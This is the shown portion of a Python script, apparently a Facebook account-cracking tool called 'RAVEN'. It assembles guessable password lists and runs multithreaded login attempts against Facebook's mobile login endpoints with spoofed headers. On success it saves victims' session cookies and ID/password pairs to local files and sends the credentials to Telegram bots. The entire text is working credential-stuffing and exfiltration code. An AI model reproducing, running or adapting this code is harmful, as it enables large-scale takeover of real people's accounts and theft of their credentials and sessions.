 ÔπéÔπéÔπéÔπéÔπéÔπéÔπéÔπéÔπéÔπéÔπéÔπéÔπéÔπé
[5] - Random | ÿ®ÿßÿ≥Ÿàÿ±ÿØ ÿπÿ¥Ÿàÿßÿ¶Ÿä .üî•
 ÔπéÔπéÔπéÔπéÔπéÔπéÔπéÔπéÔπéÔπéÔπéÔπéÔπéÔπé
''')
                linex()
                ppp = input(' Choose: ')
                if ppp in ['1', '01']:
                    plist.append('19801980')
                    plist.append('19801980')
                    plist.append('19811981')
                    plist.append('19821982')
                    plist.append('19831983')
                    plist.append('19841984')
                    plist.append('19851985')
                    plist.append('19861986')
                    plist.append('19871987')
                    plist.append('19881988')
                    plist.append('19891989')
                    plist.append('19901990')
                    plist.append('19911991')
                    plist.append('19921992')
                    plist.append('19931993')
                    plist.append('19941994')
                    plist.append('19951995')
                    plist.append('19961996')
                    plist.append('19971997')
                    plist.append('19981998')
                    plist.append('19991999')
                    plist.append('20002000')
                    plist.append('20012001')
                    plist.append('20022002')
                    plist.append('20032003')
                    plist.append('20042004')
                    plist.append('20052005')
                    plist.append('20062006')
                    plist.append('20072007')
                    plist.append('20082008')
                    plist.append('20092009')
                    plist.append('20102010')
                elif ppp in ['3', '03']:
                    plist.append('qqwwee')
                    plist.append('aassdd')
                    plist.append('07700770')
                    plist.append('qqqqwwww')
                    plist.append('zzzzxxxx')
                    plist.append('07700770')
                    plist.append('20212021')
                    plist.append('07700770')
                    plist.append('00009999')
                    plist.append('12345@12345')
                    plist.append('22446688')
                    plist.append('11112222')
                    plist.append('mmnnbbvv')
                    plist.append('firstlast')
                    plist.append('firstfirst')
                    plist.append('first first')
                    plist.append('zzxxccvv')
                    plist.append('ppooiiuuyy')
                    plist.append('ppooiiuu')
                    plist.append('qqwweerr')
                    plist.append('qqwweerrtt')
                    plist.append('aassddff')
                    plist.append('qqwwee')
                    plist.append('aassdd')
                    plist.append('zzxxcc')
                    plist.append('zzxxccvv')
                    plist.append('asdfghjklasdfghjkl')
                    plist.append('qqwweerrttyyuuiioopp')
                    plist.append('qqwweerrttyy')
                    plist.append('qwertyuiopqwertyuiop')
                    plist.append('asdfghjklasdfghjkl')
                    plist.append('llkkjjhh')
                    plist.append('mmnnbbvvccxxzz')
                    plist.append('zzxxccvvbbnnmm')
                    plist.append('aaaassss')
                    plist.append('qqqqwwww')
                    plist.append('qwertyuiop')
                    plist.append('nnnnmmmm')
                    plist.append('zxcvzxcv')
                    plist.append('19991999')
                    plist.append('20062006')
                    plist.append('19951995')
                    plist.append('19931993')
                    plist.append('ppppoooo')
                    plist.append('oooopppp')
                    plist.append('mmmmnnnn')
                    plist.append('19901990')
                    plist.append('19911991')
                    plist.append('19921992')
                    plist.append('19941994')
                    plist.append('20232023')
                    plist.append('19961996')
                    plist.append('19971997')
                    plist.append('19981998')
                    plist.append('20202020')
                    plist.append('20002000')
                    plist.append('20012001')
                    plist.append('20022002')
                    plist.append('20032003')
                    plist.append('20042004')
                    plist.append('20052005')
                    plist.append('20102010')
                    plist.append('20072007')
                    plist.append('20082008')
                    plist.append('20092009')
                    plist.append('ppppoooo')
                    plist.append('oooopppp')
                    plist.append('0099887766')
                    plist.append('5544332211')
                    plist.append('07700770')
                    plist.append('11112222')
                    plist.append('11110000')
                    plist.append('1234512345@@')
                elif ppp in ['4', '04']:
                    plist.append('firstlast')
                    plist.append('first last')
                    plist.append('firstfirst')
                    plist.append('first first')
                    plist.append('last first ')
                    plist.append('lastfirst')
                elif ppp in ['5', '05']:
                    plist.append('11223344@@@')
                    plist.append('112233445566@@')
                    plist.append('1234@@@@')
                    plist.append('0099887766')
                    plist.append('qwert12345')
                    plist.append('11223344@@')
                    plist.append('1122334455@@')
                    plist.append('112233@@')
                    plist.append('first last')
                    plist.append('firtslast')
                    plist.append('first123')
                    plist.append('22446688')
                    plist.append('90909090')
                    plist.append('12341234@@')
                    plist.append('77889900')
                    plist.append('10002000')
                    plist.append('07700770')
                    plist.append('6677889900')
                    plist.append('11110000')
                    plist.append('00998877')
                    plist.append('20232023')
                    plist.append('1234512345@@')
                    plist.append('12345qwert')
                    plist.append('123@@123')
                    plist.append('20002000')
                    plist.append('5544332211')
                    plist.append('123456$$')
                    plist.append('19801980')
                    plist.append('19951995')
                    plist.append('11112222')
                elif ppp in ['2', '02']:
                    plist.append('qqwwee')
                    plist.append('aassdd')
                    plist.append('07700770')
                    plist.append('qqqqwwww')
                    plist.append('zzzzxxxx')
                    plist.append('07700770')
                    plist.append('20212021')
                    plist.append('07700770')
                    plist.append('00009999')
                    plist.append('12345@12345')
                    plist.append('22446688')
                    plist.append('11112222')
                    plist.append('mmnnbbvv')
                    plist.append('firstlast')
                    plist.append('firstfirst')
                    plist.append('first first')
                    plist.append('zzxxccvv')
                    plist.append('ppooiiuuyy')
                    plist.append('ppooiiuu')
                    plist.append('qqwweerr')
                    plist.append('qqwweerrtt')
                    plist.append('aassddff')
                    plist.append('qqwwee')
                    plist.append('aassdd')
                    plist.append('zzxxcc')
                    plist.append('zzxxccvv')
                    plist.append('asdfghjklasdfghjkl')
                    plist.append('qqwweerrttyyuuiioopp')
                    plist.append('qqwweerrttyy')
                    plist.append('qwertyuiopqwertyuiop')
                    plist.append('asdfghjklasdfghjkl')
                    plist.append('llkkjjhh')
                    plist.append('mmnnbbvvccxxzz')
                    plist.append('zzxxccvvbbnnmm')
                    plist.append('aaaassss')
                    plist.append('qqqqwwww')
                    plist.append('qwertyuiop')
                    plist.append('nnnnmmmm')
                    plist.append('zxcvzxcv')
                else:
                    try:
                        linex()
                        ps_limit = int(input(' How many passwords do you want to add ? '))
                    except:
                        ps_limit = 1
                    linex()
                    print('\x1b[1;32m exp: first last,firtslast,first123')
                    linex()
                    for i in range(ps_limit):
                        plist.append(input(f' Put password {i + 1}: '))
                linex()
                print(' (y/n): ')
                linex()
                cx = 'y'
                if cx in ['y', 'Y', 'yes', 'Yes', '1']:
                    pcp.append('y')
                else:
                    pcp.append('n')
                with tred(max_workers=30) as crack_submit:
                    clear()
                    total_ids = str(len(fo))
                    lim = int(total_ids)
                    print('\x1b[1;33mTOTAL \x1b[1;94m> \x1b[1;96m' + total_ids)
                    #print('~ '*10)
                    print('\x1b[1;32m \n WELCOME TO A RAVEN TOOL üñ§  ')
                    linex()
                    for user in fo:
                        ids, names = user.split('|')
                        passlist = plist
                        if mthd in ['1', '01']:
                            crack_submit.submit(ffb, ids, names, passlist)
                        elif mthd in ['2', '02']:
                            crack_submit.submit(api, ids, names, passlist)
                        else:
                            crack_submit.submit(api1, ids, names, passlist)
                        if mthd in ['3', '03']:
                            crack_submit.submit(api2, ids, names, passlist)
                print('\x1b[1;37m')
                linex()
                print(' Total OK/CP : ' + str(len(oks)) + '/' + str(len(cps)))
                linex()
            else:
                exit('')
        else:
            exit()
            linex()
            exit()
    except ValueError:
        exit()
    except requests.exceptions.ConnectionError:
        print('\n No internet connection ...')
        exit()

def ffb(ids, names, passlist):
    global loop, oks, cps, lim
    p = round(loop * 100 / lim, 2)
    sys.stdout.write('\r\r\x1b[1;37m‚ûõ [\x1b[1;32mRaVeN\x1b[1;37m] \x1b[1;37m[\x1b[1;32m%s\x1b[1;37m] \x1b[1;37m[\x1b[1;32mOK\x1b[1;37m/\x1b[1;91mCP\x1b[1;37m] \x1b[1;37m[\x1b[1;32m%s\x1b[1;37m\x1b[1;37m] \x1b[1;37m[\x1b[1;96m%s%%\x1b[1;37m]\x1b[1;37m ' % (loop, len(oks), p))
    sys.stdout.flush()
    session = requests.Session()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
            ua = random.choice(ugen)
            ua = random.choice(ugen2)
            head = {'method': 'GET', 'path': '/', 'scheme': 'https', 'authority': 'm.facebook.com', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'en-US,en;q=0.9', 'cache-control': 'max-age=0', 'dpr': '3', 'sec-ch-ua': '"Google Chrome";v="87", "Chromium";v="87", "Not=A?Brand";v="24"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '"iOS"', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'none', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': ua}
            getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
            idpass = {'lsd': re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1), 'uid': ids, 'next': 'https://free.facebook.com/login/save-device/', 'flow': 'login_no_pin', 'pass': pas}
            complete = session.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0', data=idpass, allow_redirects=False, headers=head)
            MOHAMED = str(session.cookies)
            if 'c_user' in MOHAMED:
                kuki = ';'.join(['%s=%s' % (key, value) for key, value in session.cookies.get_dict().items()])
                print(f'\r\r\x1b[1;32m \n¬´¬´¬´¬´¬´¬´¬´¬´¬´¬´[OK]¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª \n ùêî ùêí ùêÑ ùêë :  {ids!s} Ô¥ø\n | ùêè ùêÄ ùêí ùêí {pas!s} : Ô¥ø\n | YEAR {tahun(ids)} : Ô¥ø\n‚Ä¢  ‚úÆ ¬ª @zzz_9k  - @F_M_D Ô¥ø\n¬´¬´¬´¬´¬´¬´¬´¬´¬´¬´[OK]¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª')
                statusok = f'  ‡¢™ŸäŸÅŸÜ\n        ‡¢™ŸäŸÅŸÜ ÿ¨ÿßÿ®ÿ™ŸÑŸÉ ÿ≠ÿ≥ÿßÿ® ÿ¥ÿ∫ÿßŸÑ ü¶Ö\t\n\x1b[1;32m OK ‚úÖ ÿ¥ÿ∫ÿßŸÑ\n‚ãò RAVEN-OK‚ãô \n‚ùñ - ùêîùêíùêÑùêëùêçùêÄùêå : {ids}\n\n‚ùñ - ùêèùêÄùêíùêíùêñùêëùêÉ : {pas}\n\n‚ùñ - YEAR : {tahun(ids)}\n\n‚ãòIbn Haqq-OK‚ãô \n<RAVEN > - @F_M_D\n\t\t\t\n\t\t\t\t'
                FDG = f'Ÿàÿßÿ≠ÿØ ÿµÿßÿØ ÿ≠ÿ≥ÿßÿ® ÿ¥ÿ∫ÿßŸÑ ‚ô•\nÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ : tg://openmessage?user_id={ID}\n\n'
                requests.post(f'https://api.telegram.org/bot' + str(TOKEN) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(statusok))
                requests.post(f'https://api.telegram.org/bot' + str(TOKEN2) + '/sendMessage?chat_id=' + str(ID2) + '&text=' + str(FDG))
                dc = dict(session.cookies)
                coki = ';'.join([k + '=' + v for k, v in dc.items()])
                open('/sdcard/ajjn6-COOKIE.txt', 'a').write(coki + '\n')
                open('/sdcard/ajjn6-OK.txt', 'a').write(ids + '|' + pas + '\n')
                oks.append(ids)
                break
            elif 'checkpoint' in MOHAMED:
                if 'y' in pcp:
                    print('\r\r\x1b[38;5;208m [VIP_CP] ' + ids + ' | ' + pas + '\x1b[1;97m')
                    statusok = f'  ‡¢™ŸäŸÅŸÜ\n\x1b[38;5;208m CPüíî ÿ≥ŸÉŸäŸàÿ± ÿßŸÜÿ™ÿ∏ÿ±ÿ± ‚úÖ\n‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÅ<CP>‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÅ\n‚ùñ - ùêîùêíùêÑùêëùêçùêÄùêå : {ids}\n\n‚ùñ - ùêèùêÄùêíùêíùêñùêëùêÉ : {pas}\n\n‚ùñ - YEAR : {tahun(ids)}\n\n‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÅ<CP>‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÅ\n<‡¢™ŸäŸÅŸÜ> - @F_M_D\n\t\t\t\n\t\t\t\t'
                    requests.post(f'https://api.telegram.org/bot' + str(TOKEN) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(statusok))
                    open('/sdcard/@F_M_D-CP.txt', 'a').write(ids + '|' + pas + '\n')
                    cps.append(ids)
                    break
                else:
                    break
            else:
                continue
    except requests.exceptions.ConnectionError:
        time.sleep(31)
    loop += 1
menu()
